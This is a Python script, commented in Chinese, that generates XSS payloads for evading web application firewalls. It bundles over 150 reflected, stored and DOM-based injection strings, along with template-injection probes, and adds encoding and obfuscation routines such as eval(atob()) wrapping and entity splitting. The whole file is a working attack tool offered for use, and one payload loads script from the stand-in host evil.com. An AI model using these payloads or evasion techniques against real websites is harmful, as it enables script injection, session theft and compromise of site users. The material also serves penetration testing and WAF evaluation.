#!/usr/bin/env python3
"""
XSS WAF 绕过 Payload 生成器
内置 150+ 绕过 payload，覆盖反射型/存储型/DOM 型 XSS，
支持多种上下文（HTML/属性/JS/URL/样式）和多种编码/混淆方式。
"""

import argparse
import base64
import json
import os
import random
import sys
import urllib.parse
import signal


# ============================================================
# XSS 绕过 Payload 数据库（150+）
# ============================================================

# 标签绕过
TAG_BYPASS = [
    ("img标签", "<img src=x onerror=alert(1)>"),
    ("svg标签", "<svg onload=alert(1)>"),
    ("body标签", "<body onload=alert(1)>"),
    ("input标签", "<input onfocus=alert(1) autofocus>"),
    ("details标签", "<details open ontoggle=alert(1)>"),
    ("video标签", "<video src=x onerror=alert(1)>"),
    ("audio标签", "<audio src=x onerror=alert(1)>"),
    ("marquee标签", "<marquee onstart=alert(1)>"),
    ("iframe标签", "<iframe src=javascript:alert(1)>"),
    ("object标签", "<object data=javascript:alert(1)>"),
    ("embed标签", "<embed src=javascript:alert(1)>"),
    ("form标签", "<form><button formaction=javascript:alert(1)>X</button></form>"),
    ("style标签", "<style onload=alert(1)>"),
    ("math标签", "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"),
    ("select标签", "<select onfocus=alert(1) autofocus>"),
    ("textarea标签", "<textarea onfocus=alert(1) autofocus>"),
    ("keygen标签", "<keygen onfocus=alert(1) autofocus>"),
    ("video+source", "<video><source onerror=alert(1)>"),
    ("audio+source", "<audio><source onerror=alert(1)>"),
    ("isindex标签", "<isindex action=javascript:alert(1)>"),
]

# 事件处理器绕过
EVENT_BYPASS = [
    ("onerror", "<img src=x onerror=alert(1)>"),
    ("onload", "<svg onload=alert(1)>"),
    ("onclick", "<div onclick=alert(1)>click</div>"),
    ("onfocus", "<input onfocus=alert(1) autofocus>"),
    ("onmouseover", "<div onmouseover=alert(1)>hover</div>"),
    ("ontoggle", "<details open ontoggle=alert(1)>"),
    ("onpointerover", "<div onpointerover=alert(1)>hover</div>"),
    ("onpointerdown", "<div onpointerdown=alert(1)>click</div>"),
    ("onanimationstart", "<style>@keyframes x{}</style><div style=animation:x onanimationstart=alert(1)>"),
    ("onanimationend", "<div style=animation:x onanimationend=alert(1)>"),
    ("onstart", "<marquee onstart=alert(1)>"),
    ("onfinish", "<marquee onfinish=alert(1)>"),
    ("onbounce", "<marquee onbounce=alert(1)>"),
    ("onbegin", "<svg><animate onbegin=alert(1)>"),
    ("oncanplay", "<video oncanplay=alert(1)>"),
    ("oncanplaythrough", "<video oncanplaythrough=alert(1)>"),
    ("ondurationchange", "<video ondurationchange=alert(1)>"),
    ("onloadeddata", "<video onloadeddata=alert(1)>"),
    ("onloadedmetadata", "<video onloadedmetadata=alert(1)>"),
    ("onloadstart", "<video onloadstart=alert(1)>"),
    ("onprogress", "<video onprogress=alert(1)>"),
    ("onstalled", "<video onstalled=alert(1)>"),
    ("onsuspend", "<video onsuspend=alert(1)>"),
    ("ontimeupdate", "<video ontimeupdate=alert(1)>"),
    ("onvolumechange", "<video onvolumechange=alert(1)>"),
    ("onwaiting", "<video onwaiting=alert(1)>"),
    ("oncuechange", "<video oncuechange=alert(1)>"),
    ("onreset", "<form onreset=alert(1)>"),
    ("onsearch", "<input type=search onsearch=alert(1)>"),
    ("onselect", "<input onselect=alert(1)>"),
    ("onsubmit", "<form onsubmit=alert(1)>"),
    ("oncontextmenu", "<div oncontextmenu=alert(1)>rightclick</div>"),
    ("ondrag", "<div draggable=true ondrag=alert(1)>drag</div>"),
    ("ondragend", "<div draggable=true ondragend=alert(1)>drag</div>"),
    ("ondragenter", "<div draggable=true ondragenter=alert(1)>drag</div>"),
    ("ondragleave", "<div draggable=true ondragleave=alert(1)>drag</div>"),
    ("ondragover", "<div draggable=true ondragover=alert(1)>drag</div>"),
    ("ondragstart", "<div draggable=true ondragstart=alert(1)>drag</div>"),
    ("ondrop", "<div draggable=true ondrop=alert(1)>drag</div>"),
    ("onkeydown", "<input onkeydown=alert(1)>"),
    ("onkeypress", "<input onkeypress=alert(1)>"),
    ("onkeyup", "<input onkeyup=alert(1)>"),
    ("onblur", "<input onblur=alert(1)>"),
    ("onchange", "<input onchange=alert(1)>"),
    ("oninput", "<input oninput=alert(1)>"),
    ("oninvalid", "<input oninvalid=alert(1)>"),
    ("onwheel", "<div onwheel=alert(1)>scroll</div>"),
    ("onscroll", "<div onscroll=alert(1) style=overflow:scroll>scroll</div>"),
    ("oncopy", "<div oncopy=alert(1)>copy</div>"),
    ("oncut", "<div oncut=alert(1)>cut</div>"),
    ("onpaste", "<div onpaste=alert(1)>paste</div>"),
]

# 大小写混合绕过
CASE_BYPASS = [
    ("大小写混合", "<ScRiPt>alert(1)</ScRiPt>"),
    ("IMG大小写", "<IMG OnErRoR=alert(1)>"),
    ("SVG大小写", "<SvG OnLoAd=alert(1)>"),
    ("混合SCRIPT", "<scr<script>ipt>alert(1)</scr</script>ipt>"),
    ("全大写", "<SCRIPT>alert(1)</SCRIPT>"),
    ("随机大小写", "<ScRiPt src=//evil.com/x.js></ScRiPt>"),
    ("属性大小写", "<img sRc=x oNeRrOr=alert(1)>"),
    ("事件大小写", "<svg oNlOaD=alert(1)>"),
    ("javascript大小写", "JaVaScRiPt:alert(1)"),
    ("onerror大小写", "<img src=x OnErRoR=alert(1)>"),
]

# 编码绕过
ENCODING_BYPASS = [
    ("HTML实体编码", "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ("Hex实体编码", "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"),
    ("十进制编码", "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/&#115;&#99;&#114;&#105;&#112;&#116;&#62;"),
    ("URL编码", "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("双重URL编码", "%253Cscript%253Ealert(1)%253C/script%253E"),
    ("Unicode编码", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
    ("Base64编码", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
    ("JS编码", "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>"),
    ("Hex编码JS", "<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>"),
    ("Oct编码", "<img src=x onerror=\\141\\154\\145\\162\\164(1)>"),
    ("混合编码", "<img src=x onerror=&#x61;lert(1)>"),
    ("数据URI", "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>"),
    ("vbscript", "<iframe src=vbscript:msgbox(1)>"),
    ("data URI", "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></object>"),
    ("HTML实体混合", "<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>"),
]

# JavaScript 伪协议
PROTOCOL_BYPASS = [
    ("javascript协议", "javascript:alert(1)"),
    ("javascript大小写", "JaVaScRiPt:alert(1)"),
    ("javascript+注释", "javascript:/*//%0aalert(1)"),
    ("javascript+换行", "javascript:%0aalert(1)"),
    ("javascript+Tab", "javascript:%09alert(1)"),
    ("javascript+空格", "javascript: alert(1)"),
    ("javascript+回车", "javascript:%0dalert(1)"),
    ("vbscript协议", "vbscript:alert(1)"),
    ("data协议", "data:text/html,<script>alert(1)</script>"),
    ("data+base64", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
]

# SVG 载体
SVG_BYPASS = [
    ("svg onload", "<svg onload=alert(1)>"),
    ("svg+animate", "<svg><animate onbegin=alert(1) attributeName=x>"),
    ("svg+set", "<svg><set onbegin=alert(1)>"),
    ("svg+animateTransform", "<svg><animateTransform onbegin=alert(1)>"),
    ("svg+discard", "<svg><discard onbegin=alert(1)>"),
    ("svg+script", "<svg><script>alert(1)</script></svg>"),
    ("svg+use", "<svg><use href=data:image/svg+xml,<svg onload=alert(1)></svg>"),
    ("svg+foreignObject", "<svg><foreignObject><body onload=alert(1)>"),
    ("svg+handler", "<svg><handler xml:base=javascript:alert(1)//>"),
    ("svg+xml", "<?xml version=1.0?><svg xmlns=... onload=alert(1)>"),
]

# 标签嵌套
NESTED_BYPASS = [
    ("嵌套script", "<scr<script>ipt>alert(1)</scr</script>ipt>"),
    ("嵌套img", "<im<img>g src=x onerror=alert(1)>"),
    ("嵌套svg", "<sv<svg>g onload=alert(1)>"),
    ("空格分割", "<script >alert(1)</script>"),
    ("换行分割", "<script\n>alert(1)</script>"),
    ("Tab分割", "<script\t>alert(1)</script>"),
    ("NULL字节", "<script\x00>alert(1)</script>"),
    ("嵌套+换行", "<scr<script\n>ipt>alert(1)</scr</script\n>ipt>"),
    ("多层嵌套", "<scr<script>ipt>ipt>alert(1)</scr</script>ipt>ipt>"),
    ("注释嵌套", "<script/*>alert(1)</script/*>"),
]

# 无引号属性
NO_QUOTE_BYPASS = [
    ("无引号img", "<img src=x onerror=alert(1)>"),
    ("无引号svg", "<svg onload=alert(1)>"),
    ("无引号input", "<input onfocus=alert(1) autofocus>"),
    ("无引号a", "<a href=javascript:alert(1)>click</a>"),
    ("无引号iframe", "<iframe src=javascript:alert(1)>"),
    ("无引号body", "<body onload=alert(1)>"),
    ("无引号video", "<video src=x onerror=alert(1)>"),
    ("无引号details", "<details open ontoggle=alert(1)>"),
    ("无引号marquee", "<marquee onstart=alert(1)>"),
    ("无引号style", "<style onload=alert(1)>"),
]

# DOM 型 XSS
DOM_BYPASS = [
    ("location.hash", "#<img src=x onerror=alert(1)>"),
    ("location.search", "?q=<img src=x onerror=alert(1)>"),
    ("document.write", "javascript:document.write('<img src=x onerror=alert(1)>')"),
    ("innerHTML", "javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'"),
    ("eval", "javascript:eval('alert(1)')"),
    ("setTimeout", "javascript:setTimeout('alert(1)',0)"),
    ("setInterval", "javascript:setInterval('alert(1)',0)"),
    ("Function", "javascript:new Function('alert(1)')()"),
    ("document.location", "javascript:document.location='javascript:alert(1)'"),
    ("window.open", "javascript:window.open('javascript:alert(1)')"),
]

# 模板注入
TEMPLATE_BYPASS = [
    ("Jinja2", "{{7*7}}"),
    ("Jinja2+config", "{{config.items()}}"),
    ("Twig", "{{7*'7'}}"),
    ("FreeMarker", "${7*7}"),
    ("Velocity", "#set($x=7*7)${x}"),
    ("Thymeleaf", "#{7*7}"),
    ("Mako", "${7*7}"),
    ("Smarty", "{7*7}"),
    ("JSP", "<%= 7*7 %>"),
    ("Ruby ERB", "<%= 7*7 %>"),
]

# 空格绕过
SPACE_BYPASS_XSS = [
    ("斜杠绕过", "<svg/onload=alert(1)>"),
    ("Tab绕过", "<svg\tonload=alert(1)>"),
    ("换行绕过", "<svg\nonload=alert(1)>"),
    ("回车绕过", "<svg\ronload=alert(1)>"),
    ("垂直制表符", "<svg\vonload=alert(1)>"),
    ("换页符", "<svg\fonload=alert(1)>"),
    ("NULL字节", "<svg\x00onload=alert(1)>"),
    ("注释绕过", "<svg/**/onload=alert(1)>"),
    ("/绕过", "<img/src=x/onerror=alert(1)>"),
    ("多/绕过", "<img//src=x//onerror=alert(1)>"),
]


# ============================================================
# 编码函数
# ============================================================

def html_entity_encode(s):
    """HTML 实体编码。"""
    return "".join(f"&#{ord(c)};" for c in s)


def html_hex_encode(s):
    """HTML Hex 实体编码。"""
    return "".join(f"&#x{ord(c):x};" for c in s)


def url_encode(s):
    """URL 编码。"""
    return urllib.parse.quote(s, safe="")


def url_double_encode(s):
    """双重 URL 编码。"""
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def base64_encode(s):
    """Base64 编码。"""
    return base64.b64encode(s.encode()).decode()


def unicode_encode(s):
    """Unicode 编码。"""
    return "".join(f"\\u{ord(c):04x}" for c in s)


def encode_payload(payload, encode_type):
    """根据编码类型对 payload 进行编码。"""
    if encode_type == "none":
        return payload
    elif encode_type == "html_entity":
        return html_entity_encode(payload)
    elif encode_type == "html_hex":
        return html_hex_encode(payload)
    elif encode_type == "url_double":
        return url_double_encode(payload)
    elif encode_type == "base64":
        return base64_encode(payload)
    elif encode_type == "unicode":
        return unicode_encode(payload)
    elif encode_type == "all":
        encoders = [html_entity_encode, html_hex_encode, url_double_encode, base64_encode, unicode_encode]
        return random.choice(encoders)(payload)
    return payload


# ============================================================
# 混淆函数
# ============================================================

def obfuscate_concat_case(payload):
    """大小写混淆。"""
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return "".join(result)


def obfuscate_entity_break(payload):
    """实体打断混淆：在标签中插入 HTML 实体。"""
    # 在标签名中间插入 HTML 实体
    return payload.replace("<script", "<scr&#105;pt").replace("<svg", "<sv&#103;")


def obfuscate_eval(payload):
    """eval 混淆：使用 eval + 编码。"""
    # 将 alert(1) 替换为 eval(atob(...))
    if "alert(1)" in payload:
        encoded = base64.b64encode(b"alert(1)").decode()
        return payload.replace("alert(1)", f"eval(atob('{encoded}'))")
    return payload


def apply_obfuscation(payload, obfuscate_type):
    """应用混淆。"""
    if obfuscate_type == "none":
        return payload
    elif obfuscate_type == "concat_case":
        return obfuscate_concat_case(payload)
    elif obfuscate_type == "entity_break":
        return obfuscate_entity_break(payload)
    elif obfuscate_type == "eval":
        return obfuscate_eval(payload)
    elif obfuscate_type == "all":
        obfuscators = [obfuscate_concat_case, obfuscate_entity_break, obfuscate_eval]
        for obf in random.sample(obfuscators, min(2, len(obfuscators))):
            payload = obf(payload)
        return payload
    return payload


# ============================================================
# Payload 生成函数
# ============================================================

def generate_payloads(xss_type, context, encode, obfuscate, count):
    """生成 XSS 绕过 payload 列表。"""
    all_payloads = []

    # 所有 payload 分类
    type_map = {
        "reflected": TAG_BYPASS + EVENT_BYPASS + CASE_BYPASS + ENCODING_BYPASS +
                     PROTOCOL_BYPASS + SVG_BYPASS + NESTED_BYPASS + NO_QUOTE_BYPASS + SPACE_BYPASS_XSS,
        "stored": TAG_BYPASS + EVENT_BYPASS + SVG_BYPASS + NESTED_BYPASS + ENCODING_BYPASS,
        "dom": DOM_BYPASS + PROTOCOL_BYPASS + ENCODING_BYPASS,
    }

    # 上下文映射
    context_map = {
        "html": TAG_BYPASS + NESTED_BYPASS + CASE_BYPASS + ENCODING_BYPASS + SVG_BYPASS,
        "attribute": NO_QUOTE_BYPASS + EVENT_BYPASS + ENCODING_BYPASS,
        "js": PROTOCOL_BYPASS + DOM_BYPASS + ENCODING_BYPASS,
        "url": PROTOCOL_BYPASS + ENCODING_BYPASS,
        "style": ENCODING_BYPASS + EVENT_BYPASS,
    }

    if xss_type == "all" and context == "all":
        # 收集所有 payload
        for x_type, payloads in type_map.items():
            for method, payload in payloads:
                all_payloads.append({"type": x_type, "original": payload, "bypass_method": method})
        for ctx, payloads in context_map.items():
            for method, payload in payloads:
                all_payloads.append({"type": ctx, "original": payload, "bypass_method": f"{ctx}: {method}"})
    elif xss_type == "all" and context != "all":
        for x_type, payloads in type_map.items():
            for method, payload in payloads:
                all_payloads.append({"type": x_type, "original": payload, "bypass_method": method})
        for method, payload in context_map.get(context, []):
            all_payloads.append({"type": context, "original": payload, "bypass_method": f"{context}: {method}"})
    elif xss_type != "all" and context == "all":
        for method, payload in type_map.get(xss_type, []):
            all_payloads.append({"type": xss_type, "original": payload, "bypass_method": method})
        for ctx, payloads in context_map.items():
            for method, payload in payloads:
                all_payloads.append({"type": xss_type, "original": payload, "bypass_method": f"{ctx}: {method}"})
    else:
        for method, payload in type_map.get(xss_type, []):
            all_payloads.append({"type": xss_type, "original": payload, "bypass_method": method})
        for method, payload in context_map.get(context, []):
            all_payloads.append({"type": xss_type, "original": payload, "bypass_method": f"{context}: {method}"})

    # 添加模板注入 payload
    for method, payload in TEMPLATE_BYPASS:
        all_payloads.append({"type": "template_injection", "original": payload, "bypass_method": method})

    # 去重
    seen = set()
    unique_payloads = []
    for p in all_payloads:
        if p["original"] not in seen:
            seen.add(p["original"])
            unique_payloads.append(p)

    # 应用编码和混淆
    result_payloads = []
    for i, p in enumerate(unique_payloads):
        original = p["original"]
        if obfuscate != "none":
            obfuscated = apply_obfuscation(original, obfuscate)
        else:
            obfuscated = original
        if encode != "none":
            encoded_payload = encode_payload(obfuscated, encode)
            is_encoded = True
        else:
            encoded_payload = obfuscated
            is_encoded = False

        result_payloads.append({
            "id": i + 1,
            "type": p["type"],
            "original": original,
            "bypass_method": p["bypass_method"],
            "payload": encoded_payload,
            "encoded": is_encoded,
        })

    if count > 0:
        result_payloads = result_payloads[:count]

    return result_payloads


# ============================================================
# 主函数
# ============================================================


_timeout_value = 300

def _timeout_handler(signum, frame):
    """超时信号处理器"""
    print(json.dumps({"status": "timeout", "error": f"操作超时({_timeout_value}秒)", "timeout": _timeout_value}, ensure_ascii=False))
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="XSS WAF 绕过 Payload 生成器"
    )
    parser.add_argument(
        "--type", default="all",
        help="XSS 类型：reflected/stored/dom/all（默认 all）"
    )
    parser.add_argument(
        "--context", default="all",
        help="上下文：html/attribute/js/url/style/all（默认 all）"
    )
    parser.add_argument(
        "--encode", default="none",
        help="编码方式：none/html_entity/url_double/base64/unicode/all（默认 none）"
    )
    parser.add_argument(
        "--obfuscate", default="none",
        help="混淆方式：none/concat_case/entity_break/eval/all（默认 none）"
    )
    parser.add_argument("--count", type=int, default=30, help="生成数量（默认 30）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=300, help="操作超时时间(秒)")
    args = parser.parse_args()

    global _timeout_value
    _timeout_value = args.timeout
    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(args.timeout)

    try:
        payloads = generate_payloads(
            args.type, args.context, args.encode, args.obfuscate, args.count
        )

        result = {
            "type": args.type,
            "context": args.context,
            "encode": args.encode,
            "obfuscate": args.obfuscate,
            "total_payloads": len(payloads),
            "payloads": payloads,
        }

        json_output = json.dumps(result, ensure_ascii=False, indent=2)

        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print(f"结果已保存到: {args.output}")
            except IOError as e:
                print(json.dumps({"error": f"写入文件失败: {e}"}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)

    except Exception as e:
        print(json.dumps({"error": f"生成失败: {e}"}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
